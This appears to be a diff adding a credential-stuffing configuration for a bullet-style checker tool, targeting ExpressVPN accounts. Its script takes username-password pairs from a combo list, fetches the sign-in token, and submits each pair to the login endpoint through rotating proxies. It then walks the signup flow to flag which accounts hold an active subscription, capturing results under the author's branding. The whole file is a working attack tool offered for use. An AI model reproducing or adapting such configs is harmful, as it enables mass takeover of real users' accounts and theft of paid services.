@@ -1,0 +1,158 @@
+﻿[SETTINGS]
+{
+  "Name": "ExpressVPN Mobile",
+  "SuggestedBots": 60,
+  "MaxCPM": 0,
+  "LastModified": "2022-02-14T10:03:40.0125276-08:00",
+  "AdditionalInfo": "",
+  "Author": "Sir Slayer",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#ExpressVPN REQUEST GET "https://www.expressvpn.com/sign-in" 
+  
+  HEADER "referer: https://www.expressvpn.com/sign-in" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.271" 
+
+#RETRY KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Retry OR 
+    KEY "<SOURCE>" DoesNotContain "name=\"authenticity_token\"" 
+
+#Token-URLEncode PARSE "<SOURCE>" LR "name=\"authenticity_token\" value=\"" "\"" EncodeOutput=TRUE -> VAR "token" 
+
+#USER-URLEncode FUNCTION URLEncode "<USER>" -> VAR "U" 
+
+#ExpressVPN-Sessions REQUEST POST "https://www.expressvpn.com/sessions" 
+  CONTENT "utf8=%E2%9C%93&authenticity_token=<token>&location_fragment=&redirect_path=&email=<U>&password=<PASS>&commit=Sign+In" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "origin: https://www.expressvpn.com" 
+  HEADER "referer: https://www.expressvpn.com/sign-in" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.271" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY ">Invalid email or password.<" 
+  KEYCHAIN Success OR 
+    KEY "Verification Needed" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "<h2>Account suspended</h2>" 
+
+#GET-CSRF-Token REQUEST GET "https://www.expressvpn.com/order" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#CSRF_auth PARSE "<SOURCE>" LR "name=\"authenticity_token\" value=\"" "\"" EncodeOutput=TRUE -> VAR "auth" 
+
+#CSRF-Token-URLEncode PARSE "<SOURCE>" LR "name=\"csrf-token\" content=\"" "\"" -> VAR "cs" 
+
+#encode FUNCTION URLEncode "<cs>" -> VAR "csrf" 
+
+#PUT-USER REQUEST PUT "https://www.expressvpn.com/signup/depart" 
+  CONTENT "{\"email\":\"<U>\"}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER ": scheme: https" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "cache-control: no-cache" 
+  HEADER "origin: https://www.expressvpn.com" 
+  HEADER "pragma: no-cache" 
+  HEADER "referer: https://www.expressvpn.com/order" 
+  HEADER "sec-ch-ua: \"Google Chrome\";v=\"95\", \"Chromium\";v=\"95\", \";Not A Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36" 
+  HEADER "x-csrf-token: <cs>" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+
+#Order REQUEST POST "https://www.expressvpn.com/signup" 
+  CONTENT "utf8=%E2%9C%93&authenticity_token=<auth>&signup%5Bpackage_id%5D=3&signup%5Bforter_token%5D=aad61f4c0b854e06996046afac516643_1644848433690__UDF43_13ck_tt&signup%5Bpayment_method%5D=5&signup%5Bemail%5D=<U>&signup%5Bfirst_name%5D=&signup%5Blast_name%5D=&signup%5Bcc_number_is_pasted%5D=0&signup%5Bcc_no%5D=&signup%5Bexpiry_month%5D=&signup%5Bexpiry_year%5D=&signup%5Bccv%5D=&signup%5Bzip%5D=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64;" 
+  HEADER "origin: https://www.expressvpn.com" 
+  HEADER "referer: https://www.expressvpn.com/order" 
+
+#Wait... PARSE "<SOURCE>" LR "wait_for: \"" "\"" EncodeOutput=TRUE -> VAR "wait" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "wait_for: \"" 
+
+#Delay FUNCTION Delay "2000" 
+
+#Payment-Method REQUEST GET "https://www.expressvpn.com/signup/please_wait?payment_method=1&wait_for=<wait>" 
+  
+  HEADER "referer: https://www.expressvpn.com/order" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.271" 
+
+#RN FUNCTION RandomString "162400659?d?d?d?d" -> VAR "RN" 
+
+#Waiting... REQUEST GET "https://www.expressvpn.com/signup/waiting?wait_for=<wait>&_=<RN>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64;" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "referer: https://www.expressvpn.com/signup/please_wait?payment_method=1&wait_for=<wait>" 
+  HEADER "x-csrf-token: <cs>" 
+
+#GET-Active-Account REQUEST GET "https://www.expressvpn.com/order" 
+  
+  HEADER "referer: https://www.expressvpn.com/signup/please_wait?payment_method=1&wait_for=<wait>" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.271" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<SOURCE>" DoesNotContain "Email already has active account" 
+
+#Status FUNCTION Constant "✔️" -> CAP "STATUS" 
+
+#Login_on FUNCTION Constant "Phone only" -> CAP "Login on" 
+
+#By_BAKATOU FUNCTION Constant "🔥Sir Slayer🔥" -> CAP "CONFIG BY" 
+
